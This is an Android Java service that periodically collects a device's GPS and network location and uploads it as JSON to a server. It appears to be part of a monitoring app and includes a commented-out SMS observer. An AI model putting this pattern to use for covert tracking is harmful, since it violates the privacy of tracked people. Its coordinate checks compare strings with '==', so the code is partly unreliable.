package com.inet.android.location;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;

import org.json.JSONException;
import org.json.JSONObject;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.location.GpsSatellite;
import android.location.GpsStatus;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.location.LocationProvider;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.os.IBinder;
import android.preference.PreferenceManager;

import com.inet.android.request.DataRequest;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;
import com.inet.android.utils.WorkTimeDefiner;

public class LocationTracker extends Service implements GpsStatus.Listener,
		LocationListener {

	private static final String TAG = "locationService";
	LocationValue locationValue;;
	ConvertDate date;
	private static final int SERVICE_REQUEST_CODE = 15;
	// The minimum distance to change Updates in meters
	private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 30; // 100
	float bestAccuracy = 1000; // meters

	// The minimum time between updates in milliseconds
	private static long MIN_TIME_BW_UPDATES; // 5 minute
	private static long MIN_TIME_BW_UPDATES1 = 1000 * 60 * 60 * 1; // 24 часа
	// Declaring a Location Manager
	protected LocationManager locationManager;

	private int timeUp = 0;
	// flag for GPS status
	boolean isGPSEnabled = false;
	SharedPreferences sp;
	// flag for network status
	boolean isNetworkEnabled = false;
	String bestProvider = null;
	// flag for GPS status
	boolean canGetLocation = false;
	private Context mContext;
	Editor e;
	Location location; // location
	double latitude; // latitude
	double longitude; // longitude
	String locMetod;
	String ID;
	String nameId;
	int minute;
	String type = "9";

	String provider = null;
	StringBuilder sendStrings;

	@Override
	public void onCreate() {
		Logging.doLog(TAG, "onCreate() GPS", "onCreate() GPS");
		mContext = getApplicationContext();
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		mContext = getApplicationContext();
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		locationManager = (LocationManager) mContext
				.getSystemService(LOCATION_SERVICE);
		// contentObserved();
		// ----------get geo time
		// ---------------------------------------------------
		Logging.doLog(TAG, "onStartCommand gpsTracker",
				"onStartCommand gpsTracker");
		if (sp.getString("geo", "5").equals("0")) {
			Logging.doLog(TAG, "Location Stop", "Location Stop");
			locationManager.removeUpdates(this);
			locationManager.removeGpsStatusListener(this);
			return 0;
		}
		MIN_TIME_BW_UPDATES = Integer.parseInt(sp.getString("geo", "5")) * 1000 * 60;
		Logging.doLog(TAG, "onStartCommand gpsTracker " + MIN_TIME_BW_UPDATES,
				"onStartCommand gpsTracker " + MIN_TIME_BW_UPDATES);
	
		timeUp = Integer.parseInt(sp.getString("geo", "5"));
		// ----------restart service
		// ---------------------------------------------------

		Calendar cal = Calendar.getInstance();
		cal.add(Calendar.MINUTE, timeUp);// через 5 минут
		PendingIntent servicePendingIntent = PendingIntent.getService(this,
				SERVICE_REQUEST_CODE, new Intent(this, LocationTracker.class),// SERVICE_REQUEST_CODE
																				// -
																				// уникальный
																				// int
																				// сервиса
				PendingIntent.FLAG_UPDATE_CURRENT);

		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
				servicePendingIntent);
		// ----------is work ---------------------------------------------------

		boolean isWork = WorkTimeDefiner.isDoWork(getApplicationContext());
		if (!isWork) {
			Logging.doLog(TAG, "isWork return " + Boolean.toString(isWork),
					"isWork return " + Boolean.toString(isWork));
			return 0;
		} else {
			Logging.doLog(TAG, Boolean.toString(isWork),
					Boolean.toString(isWork));
		}
		getLocation();
		super.onStartCommand(intent, flags, startId);
		return Service.START_STICKY;
	}

	public Location getLocation() {
		try {
			Logging.doLog(TAG, "GetLocation ", "GetLocation ");
			date = new ConvertDate();
			locationValue = new LocationValue();

			// --------------- getting GPS
			// status-------------------------------------------
			isGPSEnabled = locationManager
					.isProviderEnabled(LocationManager.GPS_PROVIDER);

			Logging.doLog(TAG, "isGPS " + Boolean.toString(isGPSEnabled),
					"isGPS " + Boolean.toString(isGPSEnabled));

			// --------------- getting network
			// status--------------------------------------
			isNetworkEnabled = locationManager
					.isProviderEnabled(LocationManager.NETWORK_PROVIDER);

			Logging.doLog(TAG,
					"isNetwork " + Boolean.toString(isNetworkEnabled),
					"isNetwork " + Boolean.toString(isNetworkEnabled));
			// --------------- getting geo_mode
			// --------------------------------------------

			if ((sp.getString("geo_mode", "1").equals("1")) && isGPSEnabled) {

				locationValue.setGPSLocation(true);
				Logging.doLog(TAG, "GPS set true ", "GPS set true ");

			} else {
				Logging.doLog(TAG,
						"GPS set false " + sp.getString("geo_mode", "1"),
						"GPS set false " + sp.getString("geo_mode", "1"));
				locationValue.setGPSLocation(false);
				locationManager.removeGpsStatusListener(this);
				
				// locationManager.removeNmeaListener(this);

			}
			// --------------- getting location
			// method---------------------------------------

			if (!isGPSEnabled && !locationValue.getGPSLocation()) {
				// no network provider is enabled
				Logging.doLog(TAG, "!isGPS&&isNetwork ", "!isGPS&&isNetwork ");
				return null;
			} else {
				this.canGetLocation = true;
				// if Network Enabled get lat/long using GPS Services
				if (isOnline() == true) {
					Logging.doLog(TAG, "Network isOnline ", "Network isOnline ");
					if (isNetworkEnabled == true) {
						netLoc();
					}
				}
				if (locationValue.getGPSLocation() == true) {
					Logging.doLog(TAG, "GPS Enabled", "GPS Enabled");
					locationManager.addGpsStatusListener(this);
					gpsLoc();
					
					// locationManager.addNmeaListener(this);

				}
				getLast();
			}

		} catch (Exception e) {
			e.printStackTrace();
		}

		return location;
	}

	// -----------------search last coordinates-----------------------

	private void getLast() {
		SimpleDateFormat TIMESTAMP = new SimpleDateFormat(
				"yyyy-MM-dd HH:mm:ss", Locale.getDefault());
		Location bestResult = null;
		float accuracy;
		long time;
		long bestTime = 0;
		float bestAccuracy = 1000;
		long minTime = 0;
		List<String> matchingProviders = locationManager.getAllProviders();
		Logging.doLog(TAG, "LocMan " + matchingProviders.toString(), "LocMan "
				+ matchingProviders.toString());
		sendStrings = new StringBuilder();
		for (String provider : matchingProviders) {
			location = locationManager.getLastKnownLocation(provider);

			if (location != null) {
				accuracy = location.getAccuracy();
				time = location.getTime();

				// Выводим Дату по шаблону
				String date2 = TIMESTAMP.format(time);
				Logging.doLog(TAG, "last update " + provider + " " + date2,
						"last update " + provider + " " + date2);
				long timeSys = System.currentTimeMillis();
				minTime = timeSys - MIN_TIME_BW_UPDATES1;

				Logging.doLog(TAG, "time + accuracy " + Long.toString(time)
						+ " " + Float.toString(accuracy), "time + accuracy "
						+ Long.toString(time) + " " + Float.toString(accuracy));
				if ((time > minTime && accuracy < bestAccuracy)) {
					bestResult = location;
					longitude = location.getLongitude();
					latitude = location.getLatitude();
					bestAccuracy = accuracy;
					bestTime = time;
					bestProvider = provider;
					// Выводим Дату по шаблону
					String date1 = TIMESTAMP.format(bestTime);
					Logging.doLog(TAG, "bestAccuracy: " + date1 + " "
							+ accuracy + " " + bestResult, "bestAccuracy: "
							+ date1 + " " + accuracy + " " + bestResult);
				} else if (time < minTime && bestAccuracy == Float.MAX_VALUE
						&& time > bestTime) {
					bestResult = location;
					bestTime = time;
					bestProvider = provider;
					bestAccuracy = accuracy;
					longitude = location.getLongitude();
					latitude = location.getLatitude();
					Logging.doLog(TAG, "else " + Long.toString(bestTime) + " "
							+ bestResult, "else " + Long.toString(bestTime)
							+ " " + bestResult);
				}
			}

		}
		locationValue.setProvider(bestProvider);
		locationValue.setLatitude(latitude);
		locationValue.setLongitude(longitude);
		locationValue.setAccuracy(bestAccuracy);
		sendLoc();

	}

	public boolean isOnline() {
		ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo netInfo = cm.getActiveNetworkInfo();
		if (netInfo != null && netInfo.isConnectedOrConnecting()) {
			return true;
		}
		return false;
	}

	public void netLoc() {
		// locMetod = "network";
		locationManager.requestLocationUpdates(
				LocationManager.NETWORK_PROVIDER, MIN_TIME_BW_UPDATES,
				MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
		Logging.doLog(TAG, "Network Location", "Network Location");

	}

	public void gpsLoc() {
		// locMetod = "network";
		locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER,
				MIN_TIME_BW_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
		Logging.doLog(TAG, "GPS Location", "GPS Location");

	}

	public void sendLoc() {
		Logging.doLog(
				TAG,
				Double.toString(locationValue.getLatitude())
						+ Double.toString(locationValue.getLongitude()),
				Double.toString(locationValue.getLatitude())
						+ Double.toString(locationValue.getLongitude()));
		if (Double.toString(locationValue.getLatitude()) == "0.0"
				&& Double.toString(locationValue.getLongitude()) == "0.0") {
			Logging.doLog(TAG, "equals = 0.0", "equals = 0.0");

		} else {

			// -------send sms----------------------------
			String sendJSONStr = null;
			JSONObject info = new JSONObject();
			JSONObject object = new JSONObject();
			try {

				info.put("ttl", locationValue.getProvider());
				info.put("data", locationValue.getLatitude() + ","
						+ locationValue.getLongitude());
				info.put("accuracy", locationValue.getAccuracy());
				object.put("time", date.logTime());
				object.put("type", type);
				object.put("info", info);

				sendJSONStr = object.toString();
			} catch (JSONException e) {
				Logging.doLog(TAG, "json сломался", "json сломался");
			}

			DataRequest dr = new DataRequest(mContext);
			dr.sendRequest(sendJSONStr);

			Logging.doLog(TAG, sendJSONStr, sendJSONStr);
			Logging.doLog(TAG, sendJSONStr);

		}
	}

	public void sendNoLoc() {
		Logging.doLog(TAG, "No location", "No location");
	}

	/**
	 * Function to show settings alert dialog On pressing Settings button will
	 * lauch Settings Options
	 * */

	@Override
	public void onLocationChanged(Location location) {
		if (location != null) {
			if (Double.toString(location.getLatitude()) == "0.0"
					&& Double.toString(location.getLongitude()) == "0.0") {
				if (location.getProvider() == "gps")
					if (locationValue.getGPSLoc()) {
						Logging.doLog(TAG,
								"loc change" + location.getProvider(),
								"loc change" + location.getProvider());
						locationValue.setProvider(location.getProvider());
						locationValue.setLatitude(location.getLatitude());
						locationValue.setLongitude(location.getLongitude());
						locationValue.setAccuracy(location.getAccuracy());
					}
			} else {
				Logging.doLog(TAG, "loc change" + location.getProvider(),
						"loc change  " + location.getProvider());
				locationValue.setProvider(location.getProvider());
				locationValue.setLatitude(location.getLatitude());
				locationValue.setLongitude(location.getLongitude());
				locationValue.setAccuracy(location.getAccuracy());
			}
		}
	}

	@Override
	public void onProviderDisabled(String provider) {
	}

	@Override
	public void onProviderEnabled(String provider) {
	}

	@Override
	public void onStatusChanged(String provider, int status, Bundle extras) {
		/* This is called when the GPS status alters */
		switch (status) {
		case LocationProvider.OUT_OF_SERVICE:
			Logging.doLog(TAG, "Status Changed: Out of Service",
					"Status Changed: Out of Service");

			break;
		case LocationProvider.TEMPORARILY_UNAVAILABLE:
			Logging.doLog(TAG, "Status Changed: Temporarily Unavailable",
					"Status Changed: Temporarily Unavailable");

			break;
		case LocationProvider.AVAILABLE:
			Logging.doLog(TAG, "Status Changed: Available",
					"Status Changed: Available");

			break;
		}
	}

	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}

	// public void contentObserved() {
	// if (smsSentObserver == null) {
	// smsSentObserver = new SmsSentObserver(new Handler(), mContext);
	// mContext.getContentResolver().registerContentObserver(
	// Uri.parse("content://sms"), true, smsSentObserver);
	// }
	// }

	@Override
	public void onGpsStatusChanged(int event) {
		// TODO Автоматически созданная заглушка метода
		GpsStatus status = locationManager.getGpsStatus(null);

		switch (event) {
		case GpsStatus.GPS_EVENT_FIRST_FIX:
			Logging.doLog(TAG, "GPS_EVENT_FIRST_FIX", "GPS_EVENT_FIRST_FIX");
			if (status.getTimeToFirstFix() < 1000 * 20)
				locationValue.setGPSFix(true);
			else
				return;
			break;
		case GpsStatus.GPS_EVENT_SATELLITE_STATUS:
			if (locationValue.getGPSFix() == true) {
				Logging.doLog(TAG, "GPS_EVENT_SATELLITE_STATUS",
						"GPS_EVENT_SATELLITE_STATUS");

				Iterable<GpsSatellite> satellites = status.getSatellites();

				Iterator<GpsSatellite> sats = satellites.iterator();
				int i = 0;

				while (sats.hasNext()) {
					sats.next();
					i += 1;
				}
				locationValue.setSatsAvailable(i);
				Logging.doLog(TAG,
						Integer.toString(locationValue.getSatsAvailable()),
						Integer.toString(locationValue.getSatsAvailable()));

				if (locationValue.getSatsAvailable() >= 4) {
					Logging.doLog(TAG, "Sats >= 4", "Sats >= 4");
					locationValue.setGPSLoc(true);
				}
			}
			break;
		case GpsStatus.GPS_EVENT_STARTED:
			Logging.doLog(TAG, "GPS_EVENT_STARTED", "GPS_EVENT_STARTED");

			break;
		case GpsStatus.GPS_EVENT_STOPPED:
			Logging.doLog(TAG, "GPS_EVENT_STOPPED", "GPS_EVENT_STOPPED");
			locationValue.setGPSFix(false);
			break;
		}
	}
}
